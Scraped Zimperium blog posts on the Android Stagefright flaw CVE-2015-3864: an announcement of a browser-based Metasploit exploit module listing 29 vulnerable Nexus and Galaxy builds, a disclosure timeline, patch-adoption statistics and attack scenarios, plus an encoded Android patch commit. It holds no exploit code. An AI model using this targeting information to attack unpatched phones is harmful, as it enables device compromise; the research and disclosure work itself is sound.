Google’s Android Security Team has invested heavily in responding to media-related security problems by hardening Mediaserver (and the OS too) significantly in Android Nougat. Unfortunately, the adoption rate of new versions of Android is very slow. Nearly one year after its initial release, Android Marshmallow (6.0) is only running on 18.7% of devices in the ecosystem. If this trend continues, Android Nougat will only be used on roughly the same number of devices this time next year. Any device not updated will not benefit from a majority of the improvements Google has made in response to our (and others’) research related to multimedia processing. We implore those responsible for releasing updates to do whatever possible to rectify this situation.

The latest effort, undertaken by our [Joshua J. Drake](https://www.twitter.com/jduck), culminated in a Metasploit-module that exploits CVE-2015-3864 via the Web browser. This module is able to exploit a vulnerable device using only three quick HTTP requests and supports 29 different device/firmware versions simultaneously — a significant improvement over the [Metaphor exploit](https://github.com/NorthBit/Metaphor/tree/master/metaphor). We collaborated with Rapid7 to integrate with the very recent “mettle” payload developed by the Metasploit team. This payload executes purely in memory, which allows operating within the SELinux policy that restricts mediaserver on Android 5.x to yield a meterpreter session.

[![screen1](https://www.zimperium.com/wp-content/uploads/2016/09/screen1.png)](https://asciinema.org/a/8jlbdq006wsnkqewvcaf05wva)

The following builds are supported by the module at this time:

1. Nexus 7 (Wi-Fi) (razor) with Android 5.0 (LRX21P)
2. Nexus 7 (Wi-Fi) (razor) with Android 5.0.1 (LRX22C)
3. Nexus 7 (Wi-Fi) (razor) with Android 5.0.2 (LRX22G)
4. Nexus 7 (Wi-Fi) (razor) with Android 5.1 (LMY47O)
5. Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY47V)
6. Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48G)
7. Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48I)
8. Nexus 7 (Mobile) (razorg) with Android 5.0.2 (LRX22G)
9. Nexus 7 (Mobile) (razorg) with Android 5.1 (LMY47O)
10. Nexus 7 (Mobile) (razorg) with Android 5.1.1 (LMY47V)
11. Nexus 5 (hammerhead) with Android 5.0 (LRX21O)
12. Nexus 5 (hammerhead) with Android 5.0.1 (LRX22C)
13. Nexus 5 (hammerhead) with Android 5.1 (LMY47D)
14. Nexus 5 (hammerhead) with Android 5.1 (LMY47I)
15. Nexus 5 (hammerhead) with Android 5.1.1 (LMY48B)
16. Nexus 5 (hammerhead) with Android 5.1.1 (LMY48I)
17. Nexus 6 (shamu) with Android 5.0 (LRX21O)
18. Nexus 6 (shamu) with Android 5.0.1 (LRX22C)
19. Nexus 6 (shamu) with Android 5.1 (LMY47D)
20. Nexus 6 (shamu) with Android 5.1 (LMY47E)
21. Nexus 6 (shamu) with Android 5.1 (LMY47I)
22. Nexus 6 (shamu) with Android 5.1.1 (LYZ28E)
23. Nexus 6 (shamu) with Android 5.1 (LMY47M)
24. Nexus 6 (shamu) with Android 5.1.1 (LMY47Z)
25. Nexus 6 (shamu) with Android 5.1.1 (LVY48C)
26. Nexus 6 (shamu) with Android 5.1.1 (LMY48I)
27. Nexus 6 (shamu) with Android 5.1.1 (LYZ28J)
28. Nexus 6 (shamu) with Android 5.1.1 (LVY48E)
29. Samsung Galaxy S5 (VZW SM-G900V) with Android 5.0 (LRX21T)

### New Developments

On September 7th, the day after the September Android Security Bulletin was published, Google Project Zero researcher, Mark Brand, released an [analysis](https://googleprojectzero.blogspot.com/2016/09/return-to-libstagefright-exploiting.html) of and exploit for CVE 2016-3861. When we looked at Brand’s exploit, we noticed he used a nearly identical technique to what Josh used in this module. Interestingly enough, Brand found the same bug reported by Josh on August 15th, 2015. Josh’s proposed patch for this vulnerability is [here](https://gist.github.com/jduck/6c217beed59d23381385e770c4e1f37f). The [bug](https://code.google.com/p/android/issues/detail?id=182910) report was accidentally marked as obsolete. We believe that if two independent researchers found the exact same bug, and developed the exact same techniques, the likelihood of those techniques being used for targeted attacks is high. As a result, we sped up the release of our exploit to the general public so that security teams, administrators, and penetration testers alike may test whether or not their systems remain vulnerable. We welcome the security community to build further on this work and help to maintain this module.

During our research, we identified ways that Google can make this attack less successful. We’ve already communicated these methods to Google and are happy to work with other vendors and carriers through [ZHA](/zha-zimperiums-initiative-to-fill-the-gaps-in-android-security/) to discuss these methods as well.

To download the CVE-2015-3864 exploit, simply update your Metasploit. If you don’t already have Metasploit, you can obtain it by following the instructions from the [Metasploit developer docs](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment).

### Disclosure timeline:

* May 4th 2015: Joshua reported CVE-2015-3824 to Google’s Android Security team
* August 13th 2015: Google releases a fix for CVE-2015-3824
* August 13th 2015: Exodus discloses CVE-2015-3864 (duplicate of a Project Zero report)
* August 15th 2015: Joshua reported what eventually became CVE-2016-3861
* September 9th 2015: Google releases a fix for CVE-2015-3864
* March 24th 2016: Metaphor exploit released (showing ASLR bypass)
* May 2nd 2016: Josh’s report of CVE-2016-3861 was accidentally marked as obsolete
* June 6th, 2016: Josh shared our CVE-2015-3864 Metasploit module with the Google/Android Security Team
* August 12th 2016: Shared exploit with vendors and carriers through ZHA partners
* July 29th 2016: Shared details on the exploit with the GSMA Device Security Group
* August 9th 2016: Shared details on the exploit at WOOT in the Day 2 Keynote
* September 6th 2016: Google releases September bulletin
* September 7th 2016: Google Project Zero released Mark Brand’s exploit for CVE-2016-3861 using nearly identical techniques
* September 9th 2016: Android Security Team offered a $3,000 reward for CVE-2016-3861
* September 13th 2016: Android Security Team donates $6,000 to EB Research on Josh’s behalf (matching the $3,000 reward)
* September 23rd 2016: Public release

### Zimperium customers:

Zimperium’s z9 engine detects this attack, Mark Brand’s CVE-2016-3861 exploit, and much more without requiring any update. For more information about our award winning technology, [read about our products](https://www.zimperium.com/products).

 ![Avatar photo](https://secure.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=90)
##### Author: [zLabs](https://www.zimperium.com/author/zlabs/ "zLabs")

## Post navigation

[Previous Blog](https://www.zimperium.com/blog/zimperium-partners-with-blackberry-to-provide-mobile-threat-detection/)[Next Blog](https://www.zimperium.com/blog/mobile-security-is-national-security/)

##### Recommended Reading

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/stagefrightExploit2-400x250.png)
##### Reflecting on Stagefright Patches](https://www.zimperium.com/blog/reflecting-on-stagefright-patches/ "Reflecting on Stagefright Patches")

[![Reflecting on Recent iOS and Android Security Updates](data:image/svg+xml...)![Reflecting on Recent iOS and Android Security Updates](https://zimpstage.wpengine.com/wp-content/uploads/2022/11/default.jpg)

##### Reflecting on Recent iOS and Android Security Updates](https://www.zimperium.com/blog/reflecting-on-recent-ios-and-android-security-updates/ "Reflecting on Recent iOS and Android Security Updates")

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/stagefrightExploit2-400x250.png)
##### The Latest on Stagefright: CVE-2015-1538 Exploit is Now Available for Testing Purposes](https://www.zimperium.com/blog/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/ "The Latest on Stagefright: CVE-2015-1538 Exploit is Now Available for Testing Purposes")

 ![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white-300x46.png)

4055 Valley View Suite 300

Dallas, TX 75244

**US Toll Free:**  844-601-6760

**International:**  +1.415.992.8922

**General:** info@zimperium.com

**Press:** pr@zimperium.com

**[Compliance Hotline](https://my.compliancehotline.com/report/zimperium)**

**[Modern Slavery Act Statement](https://www.zimperium.com/modern-slavery-act-statement/)**

##### Learn More

* [FAQ](https://www.zimperium.com/faq/)
* [Support](https://www.zimperium.com/support/)
* [Blog](https://www.zimperium.com/blog/)
* [Threat Research](https://www.zimperium.com/zlabs/)
* [Glossary](https://www.zimperium.com/glossary/)
* [Responsible Disclosure Policy](https://lp.zimperium.com/hubfs/Zimperium/Zimperium%20Vulnerability%20Disclosure%20Policy%20%281%29.pdf)

##### Our Focus

* [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
* [Mobile Application Security](https://www.zimperium.com/mobile-app-security/)
* [Enterprise Mobile Security](https://www.zimperium.com/enterprise-mobile-security/)
* [Mobile Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
* [Mobile EDR](https://www.zimperium.com/mobile-edr/)

Copyright © 2010-2024 Zimperium.  All Rights Reserved.[Privacy Policy](https://www.zimperium.com/privacy-policy/)  | Privacy Settings



=== Content from blog.zimperium.com_191b4d78_20250124_224805.html ===


[![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)
![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)](https://www.zimperium.com)

Search for:

* [Platform](https://www.zimperium.com/platform/)
* Products
  + MOBILE ENDPOINT SECURITY
    - [Zimperium MTD](https://www.zimperium.com/mtd/)
    - [Zimperium MTD for Chromebooks](https://www.zimperium.com/chromebooks/)
    - [z3A Application Vetting](https://www.zimperium.com/z3a-advanced-app-analysis/)
    - [zSecure Resident Safety](https://www.zimperium.com/zsecure/)
  + MOBILE APPLICATION SECURITY
    - [MAPS Mobile Application Protection Suite](https://www.zimperium.com/mobile-app-protection/)
    - [zScan Application Security Testing](https://www.zimperium.com/zscan/)
    - [zKeyBox Cryptographic Key Protection](https://www.zimperium.com/zkeybox/)
    - [zShield Application Shielding](https://www.zimperium.com/zshield/)
    - [zDefend Runtime Application Self-Protection](https://www.zimperium.com/zdefend/)
  + THREAT INTELLIGENCE
    - [Advanced Mobile Threat Insights](https://www.zimperium.com/support-advancedthreatinsights/)
    - [Mobile Threat Defense Maturity](https://www.zimperium.com/mtd-maturity-model/)
* Use Cases
  + [Combatting Mobile Banking Malware](https://www.zimperium.com/mobile-banking-malware/)
  + [Implementing Mobile Zero Trust](https://www.zimperium.com/zerotrust/)
  + [Securing Mobile O365](https://www.zimperium.com/secureoffice365/)
  + [Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
  + [Ensuring Security Compliance](https://www.zimperium.com/industry/compliance/)
    - [MAS Regulations](/industry/compliance/regulations-mas/)
    - [PSD2 Regulation](https://www.zimperium.com/industry/compliance/psd2-regulation/)
    - [RMiT Regulation](https://www.zimperium.com/industry/compliance/rmit-regulation/)
  + [Neobank Security](https://www.zimperium.com/neobanks/)
  + [Protecting Mobile Payments](https://www.zimperium.com/mobile-payments/)
  + [SoftPOS Certification](https://www.zimperium.com/softpos-providers-secure-with-zimperium/)
  + [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
  + [Connected Medical Devices and Apps](https://www.zimperium.com/industry/healthcare/connected-medical-devices-and-apps/)
* [Industries](https://www.zimperium.com/industry/)
  + [Automotive](https://www.zimperium.com/industry/automotive/)
  + [Banking](/industry/banking/)
  + [Education](https://www.zimperium.com/industry/education/)
  + [Government](https://www.zimperium.com/industry/government/)
  + [State & Local Government](https://www.zimperium.com/state-local-government/)
  + [Healthcare](https://www.zimperium.com/industry/healthcare/)
  + [Insurance](https://www.zimperium.com/industry/insurance/)
  + [Legal](https://www.zimperium.com/?page_id=1284)
  + [Pharmaceutical](https://www.zimperium.com/industry/pharmaceutical/)
  + [Retail & Mobile E-Commerce](https://www.zimperium.com/industry/retail/)
  + [Media and Entertainment](https://www.zimperium.com/ott-app-security-for-media-and-entertainment/)
* Partners
  + [zPartners](https://www.zimperium.com/partners/)
  + [Become a Partner](https://www.zimperium.com/partner-contact/)
* [Company](https://www.zimperium.com/company/)
  + [About Zimperium](https://www.zimperium.com/company/)
  + [News](https://www.zimperium.com/resources/press-releases/)
  + [Careers](https://www.zimperium.com/careers/)
  + [Awards](https://www.zimperium.com/company/awards/)
  + [Contact Zimperium](https://www.zimperium.com/contact-us/)
* [Resources](https://www.zimperium.com/resources/)
  + [Resources](https://www.zimperium.com/resources/)
  + [Events](https://www.zimperium.com/events/)
  + [FAQs](https://www.zimperium.com/faq/)
  + [Glossary](https://www.zimperium.com/glossary/)
  + [Threat Research](https://www.zimperium.com/zlabs/)
* [Blog](/blog/)

Search for:

[Zimperium](https://www.zimperium.com "Go to Zimperium.") > [Blogs](https://www.zimperium.com/blog/ "Go to Blogs.") > [Threat Research](https://www.zimperium.com/blog-category/threat-research/ "Go to the Threat Research Format archives.") > Reflecting on Stagefright Patches

# Reflecting on Stagefright Patches

   March 22, 2016
[zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")

Share this blog

42.84% of Android devices tested are vulnerable to CVE-2015-3864. Although Google issued an update to the Hangout app that disabled automatic processing of media files, we know that CVE-2015-3864 can be exploited remotely and reliably via the browser. The number of Android devices is estimated to be between 1.4 and 2 billion. Scaling our statistics to the global status of all Android users, we estimate that between 599.76 million and 856.8 million devices are currently vulnerable to CVE-2015-3864. ![CVE-2015-3864 vulnerable by country](https://www.zimperium.com/wp-content/uploads/2016/03/3864-vulnerable-by-country-894x1024.png)

---

In July, Zimperium uncovered set of vulnerabilities in libstagefright[[1](/experts-found-a-unicorn-in-the-heart-of-android/)] and thsmre rest is history. Vendors promised us updates for Stagefright. We launched Zimperium Handset Alliance, ZHA [[2](/zha-zimperiums-initiative-to-fill-the-gaps-in-android-security/)], where about 30 vendors and carriers can communicate. Google started to maintain monthly releases of updates [[3](https://source.android.com/security/bulletin/)]. Samsung and other vendors followed [[4](https://www.scmagazine.com/samsung-security-update-fixes-critical-bugs-hidden-in-galaxy-devices-android-os/article/467857/)][[5](https://security.samsungmobile.com/securityUpdate.smsb)]. All of this, and most users are still not receiving any updates.

After Zimperium zLabs announced Stagefright, we released the free Stagefright Detector app[[6](https://play.google.com/store/apps/details?id=com.zimperium.stagefrightdetector&hl=en)]. We know that many users received updates, but not all users. We also know that multiple groups or individuals had successful attempts at predicting or bypassing ASLR [[7](https://twitter.com/huyna89/status/636179301847580674)][[8](https://twitter.com/laginimaineb/status/629773971555229696)][[9](https://twitter.com/_arkon/status/705858542423642112)] and were able to exploit Stagefright vulnerabilities remotely. On March 4th, Northbit, released a research report that describes how to bypass ASLR when exploiting mediaserver (and libstagefright) vulnerabilities.

The following statistics do not contain the recent vulnerabilities fixed by Google[[10](http://www.eweek.com/security/google-patches-android-for-stagefright-in-march-update.html)] in the March update. We can safely assume that the very most of the devices that did not receive an update over the last month, are vulnerable to CVEs like:

* CVE-2016-0815
* CVE-2016-0816

These issues are just two examples that could allow remote code execution via mediaserver. In order to bypass SELinux, attackers would need to chain one of the two above vulnerabilities with a kernel exploit. One candidate for such exploit could be obtained by exploiting the recent vulnerability fixed in an emergency patch released on March 18th[[11](http://source.android.com/security/advisory/2016-03-18.html)] after Zimperium reported a 0day exploit being used in the wild[[12](https://twitter.com/ZIMPERIUM/status/711266039938482176)] to Google.

Other interesting vulnerabilities that were published recently are:

* CVE-2016-0828
* CVE-2016-0829

These are information disclosure vulnerabilities and could potentially leak sensitive information like addresses. Such vulnerabilities could help bypass ASLR and allow reliable exploitation via stagefright-like vulnerabilities.

Over half a million users downloaded Stagefright Detector. The results are nothing less than fascinating. Since users continue to download Stagefright Detector over time, in many cases users were already patched for some of the vulnerabilities, yet it is interesting to see how many of these users got patched over time, and in which countries.

[table id=3 /]

On the bright side, if we exclude the two vulnerabilities with the highest percentage of devices still vulnerable, CVE-2015-3864 and CVE-2015-6602, between 67.59% to 89.87% were patched against the first and second batch of Stagefright vulnerabilities.

When examining the risk on a country by country basis, some vendors and carriers deserve the “Delivered an update against all chances” award and some vendors/carriers deserve the “Don’t care about about the users’ security” award.

**Regression following an update**

We observed other trends – for example, some vendors shipped updates with regression that exposed the users to one of the CVEs that the same vendor patched in the previous release.

For example, **Sony** users with build 23.4.A.1.200, after updating from 23.4.A.0.546 got re-exposed to:

* CVE-2015-1538
* CVE-2015-6575-1
* CVE-2015-6575-2
* CVE-2015-6575-3
* CVE-2015-3824

**Motorola** devices updating from LXB22.46-28.1 (5.0.2) to LPB23.13-56 (5.1) got re-exposed to CVE-2015-3876

**Samsung** devices updating from LRX21T (5.0) to LMY47X (5.1.1), got re-exposed to CVE-2015-3876

**Samsung** devices updating from KTU84P (4.4.4) to LRX22G (5.0.2) got re-exposed to CVE-2015-3876

**Asus** devices updating from KVT49L (4.4.2) to LRX21V (5.0) got re-exposed to CVE-2015-1538,

**LG** devices updating from KOT49I (4.4.2) to LRX22G (5.0.2) got re-exposed to cve-2015-6575-1

**HUAWEI** devices updating from HUAWEIGRA-L09C02B120 (5.0) to HUAWEIGRA-L09C02B191 (5.1.1) got re-exposed to CVE-2015-6602

We noticed that after some of these regressions above, many vendors started to use Zimperium’s Stagefright Detector app to verify that there is no regression prior to sending a new build out as an update.

**New Stagefright vulnerabilities**

When we look at newer Stagefright vulnerabilities, the status is a alarming. Every month Google releases an update and other vendors follow (well… sometimes). Once such an update is available, only a small set of devices receive the update. Google will attempt to fix it with Android N, but it will take a few years before the entire ecosystem will be running Android N+. In addition, due to the large number of Android vendors and hardware manufacturers, creating updates will remain a non-trivial process, especially when drivers need non-trivial security patches.

**Once a generic exploit is public**

One potential scenario could be a worm spreading by way of mild social engineering. Such a worm would likely infect users by sending links through SMS, MMS, Instant Messages, or e-mail. If a user were to click the link, they would be taken to a malicious web server that exploits Stagefright via the browser. There are two other serious types of attacks that could leverage Stagefright vulnerabilities and **don’t require user interaction**.

The first potential scenario is a watering hole attack. Such an attack would aim to compromise mobile devices that visited a trusted but compromised site commonly used by a targeted group.

The second methodology involves MITM. These attacks could be executed via Wi-Fi access points, rogue base stations, or other compromised on-path systems.

**Remediation, protection and recommendations:**

**Organizations, Carriers and Vendors:** We detect exploitation of Stagefright vulnerabilities and can work with your teams to enable immediate detection. We can also block Stagefright exploits delivered via MMS. Contact us via stagefright-urgent@zimperium.com to discuss.

**Carriers and IM vendors**: We advise carriers and IM vendors to be prepared to block SMS messages with links in the event that a worm begins spreading.

[![cve 2015 6602 vulnerable by country](data:image/svg+xml...)![cve 2015 6602 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-6602-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-6602-vulnerable-by-country.png) [![cve 2015 6575-3 vulnerable by country](data:image/svg+xml...)![cve 2015 6575-3 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-6575-3-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-6575-3-vulnerable-by-country.png) [![cve 2015 6575-2 vulnerable by country](data:image/svg+xml...)![cve 2015 6575-2 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-6575-2-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-6575-2-vulnerable-by-country.png) [![cve 2015 6575-1 vulnerable by country](data:image/svg+xml...)![cve 2015 6575-1 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-6575-1-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-6575-1-vulnerable-by-country.png) [![cve 2015 3876 vulnerable by country](data:image/svg+xml...)![cve 2015 3876 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-3876-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-3876-vulnerable-by-country.png) [![cve 2015 3827 vulnerable by country](data:image/svg+xml...)![cve 2015 3827 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-3827-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-3827-vulnerable-by-country.png) [![cve 2015 3829 vulnerable by country](data:image/svg+xml...)![cve 2015 3829 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-3829-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-3829-vulnerable-by-country.png) [![cve 2015 3824 vulnerable by country](data:image/svg+xml...)![cve 2015 3824 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-3824-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-3824-vulnerable-by-country.png) [![cve 2015 1538 vulnerable by country](data:image/svg+xml...)![cve 2015 1538 vulnerable by country](/wp-content/uploads/2016/03/cve-2015-1538-vulnerable-by-country-894x1024.png)](/wp-content/uploads/2016/03/cve-2015-1538-vulnerable-by-country.png)

By:**Zuk Avraham**

[Follow Zuk Avraham (@ihackbanme)](https://twitter.com/ihackbanme)**Oren DB**

[Follow Oren DB (@noy\_oren)](https://twitter.com/noy_oren)**Joshua Drake**

[Follow Joshua Drake (@jduck)](https://twitter.com/jduck)**Nikias Bassen**

[Follow Nikias Bassen (@pimskeks)](https://twitter.com/pimskeks)**Yaniv Karta**

[Follow Yaniv Karta (@shokoluv)](https://twitter.com/shokoluv)

 ![Avatar photo](https://secure.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=90)
##### Author: [zLabs](https://www.zimperium.com/author/zlabs/ "zLabs")

## Post navigation

[Previous Blog](https://www.zimperium.com/blog/zimperium-expands-global-presence-with-deutsche-telekom-partnership/)[Next Blog](https://www.zimperium.com/blog/taking-a-deeper-dive-into-leech-one-of-the-three-families-of-malware-dubbed-as-triada/)

##### Recommended Reading

[![Reflecting on Recent iOS and Android Security Updates](data:image/svg+xml...)![Reflecting on Recent iOS and Android Security Updates](https://zimpstage.wpengine.com/wp-content/uploads/2022/11/default.jpg)

##### Reflecting on Recent iOS and Android Security Updates](https://www.zimperium.com/blog/reflecting-on-recent-ios-and-android-security-updates/ "Reflecting on Recent iOS and Android Security Updates")

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/stagefrightExploit2-400x250.png)
##### The Latest on Stagefright: CVE-2015-1538 Exploit is Now Available for Testing Purposes](https://www.zimperium.com/blog/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/ "The Latest on Stagefright: CVE-2015-1538 Exploit is Now Available for Testing Purposes")

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/screen1-400x250.jpg)
##### Browser-based CVE-2015-3864 Metasploit Module Now Available for Testing](https://www.zimperium.com/blog/cve-2015-3864-metasploit-module-now-available-for-testing/ "Browser-based CVE-2015-3864 Metasploit Module Now Available for Testing")

 ![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white-300x46.png)

4055 Valley View Suite 300

Dallas, TX 75244

**US Toll Free:**  844-601-6760

**International:**  +1.415.992.8922

**General:** info@zimperium.com

**Press:** pr@zimperium.com

**[Compliance Hotline](https://my.compliancehotline.com/report/zimperium)**

**[Modern Slavery Act Statement](https://www.zimperium.com/modern-slavery-act-statement/)**

##### Learn More

* [FAQ](https://www.zimperium.com/faq/)
* [Support](https://www.zimperium.com/support/)
* [Blog](https://www.zimperium.com/blog/)
* [Threat Research](https://www.zimperium.com/zlabs/)
* [Glossary](https://www.zimperium.com/glossary/)
* [Responsible Disclosure Policy](https://lp.zimperium.com/hubfs/Zimperium/Zimperium%20Vulnerability%20Disclosure%20Policy%20%281%29.pdf)

##### Our Focus

* [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
* [Mobile Application Security](https://www.zimperium.com/mobile-app-security/)
* [Enterprise Mobile Security](https://www.zimperium.com/enterprise-mobile-security/)
* [Mobile Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
* [Mobile EDR](https://www.zimperium.com/mobile-edr/)

Copyright © 2010-2024 Zimperium.  All Rights Reserved.[Privacy Policy](https://www.zimperium.com/privacy-policy/)  | Privacy Settings



=== Content from android.googlesource.com_dd5e3f95_20250124_224803.html ===
dHJlZSAxNzU3MDU1OTg2MTY2MjVkOGY3Y2FjOWY1NWUzNzJkNmQzZDFlNDQ0CnBhcmVudCAzMDRlZjkxNjI0ZTEyNjYxZTdlMzVjMmMwYzIzNWRhODRhNzNlOWMwCmF1dGhvciBOaWNrIEtyYWxldmljaCA8bm5rQGdvb2dsZS5jb20+IDE0Mzg5NzE1NjQgLTA3MDAKY29tbWl0dGVyIFRoZSBBbmRyb2lkIEF1dG9tZXJnZXIgPGFuZHJvaWQtYnVpbGRAZ29vZ2xlLmNvbT4gMTQzOTUyMDAyOSAtMDcwMAoKTVBFRzRFeHRyYWN0b3IuY3BwOiBoYW5kbGUgY2h1bmtfc2l6ZSA+IFNJWkVfTUFYCgpjaHVua19zaXplIGlzIGEgdWludDY0X3QsIHNvIGl0IGNhbiBsZWdpdGltYXRlbHkgYmUgYmlnZ2VyCnRoYW4gU0laRV9NQVgsIHdoaWNoIHdvdWxkIGNhdXNlIHRoZSBzdWJ0cmFjdGlvbiB0byB1bmRlcmZsb3cuCgpodHRwczovL2NvZGUuZ29vZ2xlLmNvbS9wL2FuZHJvaWQvaXNzdWVzL2RldGFpbD9pZD0xODIyNTEKCkJ1ZzogMjMwMzQ3NTkKQ2hhbmdlLUlkOiBJYzE2MzdmYjI2YmY2ZWRiMGZlYjFiY2YyODc2ZmQzNzBkYjFlZDU0Nwo=

=== Content from www.twitter.com_2e095165_20250126_041216.html ===



=== Content from www.zimperium.com_7e2386b5_20250126_041221.html ===


[![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)
![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)](https://www.zimperium.com)

Search for:

* [Platform](https://www.zimperium.com/platform/)
* Products
  + MOBILE ENDPOINT SECURITY
    - [Zimperium MTD](https://www.zimperium.com/mtd/)
    - [Zimperium MTD for Chromebooks](https://www.zimperium.com/chromebooks/)
    - [z3A Application Vetting](https://www.zimperium.com/z3a-advanced-app-analysis/)
    - [zSecure Resident Safety](https://www.zimperium.com/zsecure/)
  + MOBILE APPLICATION SECURITY
    - [MAPS Mobile Application Protection Suite](https://www.zimperium.com/mobile-app-protection/)
    - [zScan Application Security Testing](https://www.zimperium.com/zscan/)
    - [zKeyBox Cryptographic Key Protection](https://www.zimperium.com/zkeybox/)
    - [zShield Application Shielding](https://www.zimperium.com/zshield/)
    - [zDefend Runtime Application Self-Protection](https://www.zimperium.com/zdefend/)
  + THREAT INTELLIGENCE
    - [Advanced Mobile Threat Insights](https://www.zimperium.com/support-advancedthreatinsights/)
    - [Mobile Threat Defense Maturity](https://www.zimperium.com/mtd-maturity-model/)
* Use Cases
  + [Combatting Mobile Banking Malware](https://www.zimperium.com/mobile-banking-malware/)
  + [Implementing Mobile Zero Trust](https://www.zimperium.com/zerotrust/)
  + [Securing Mobile O365](https://www.zimperium.com/secureoffice365/)
  + [Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
  + [Ensuring Security Compliance](https://www.zimperium.com/industry/compliance/)
    - [MAS Regulations](/industry/compliance/regulations-mas/)
    - [PSD2 Regulation](https://www.zimperium.com/industry/compliance/psd2-regulation/)
    - [RMiT Regulation](https://www.zimperium.com/industry/compliance/rmit-regulation/)
  + [Neobank Security](https://www.zimperium.com/neobanks/)
  + [Protecting Mobile Payments](https://www.zimperium.com/mobile-payments/)
  + [SoftPOS Certification](https://www.zimperium.com/softpos-providers-secure-with-zimperium/)
  + [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
  + [Connected Medical Devices and Apps](https://www.zimperium.com/industry/healthcare/connected-medical-devices-and-apps/)
* [Industries](https://www.zimperium.com/industry/)
  + [Automotive](https://www.zimperium.com/industry/automotive/)
  + [Banking](/industry/banking/)
  + [Education](https://www.zimperium.com/industry/education/)
  + [Government](https://www.zimperium.com/industry/government/)
  + [State & Local Government](https://www.zimperium.com/state-local-government/)
  + [Healthcare](https://www.zimperium.com/industry/healthcare/)
  + [Insurance](https://www.zimperium.com/industry/insurance/)
  + [Legal](https://www.zimperium.com/?page_id=1284)
  + [Pharmaceutical](https://www.zimperium.com/industry/pharmaceutical/)
  + [Retail & Mobile E-Commerce](https://www.zimperium.com/industry/retail/)
  + [Media and Entertainment](https://www.zimperium.com/ott-app-security-for-media-and-entertainment/)
* Partners
  + [zPartners](https://www.zimperium.com/partners/)
  + [Become a Partner](https://www.zimperium.com/partner-contact/)
* [Company](https://www.zimperium.com/company/)
  + [About Zimperium](https://www.zimperium.com/company/)
  + [News](https://www.zimperium.com/resources/press-releases/)
  + [Careers](https://www.zimperium.com/careers/)
  + [Awards](https://www.zimperium.com/company/awards/)
  + [Contact Zimperium](https://www.zimperium.com/contact-us/)
* [Resources](https://www.zimperium.com/resources/)
  + [Resources](https://www.zimperium.com/resources/)
  + [Events](https://www.zimperium.com/events/)
  + [FAQs](https://www.zimperium.com/faq/)
  + [Glossary](https://www.zimperium.com/glossary/)
  + [Threat Research](https://www.zimperium.com/zlabs/)
* [Blog](/blog/)

Search for:

[Zimperium](https://www.zimperium.com "Go to Zimperium.") > [Blogs](https://www.zimperium.com/blog/ "Go to Blogs.") > [Mobile Security](https://www.zimperium.com/blog-category/mobile-security/ "Go to the Mobile Security Format archives."), [Partners](https://www.zimperium.com/blog-category/partners/ "Go to the Partners Format archives."), [Threat Research](https://www.zimperium.com/blog-category/threat-research/ "Go to the Threat Research Format archives.") > Browser-based CVE-2015-3864 Metasploit Module Now Available for Testing

# Browser-based CVE-2015-3864 Metasploit Module Now Available for Testing

   September 23, 2016
[zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")

Share this blog

By:**Zuk Avraham**

[Follow Zuk Avraham (@ihackbanme)](https://twitter.com/ihackbanme)**Joshua Drake**

[Follow Joshua Drake (@jduck)](https://twitter.com/jduck)

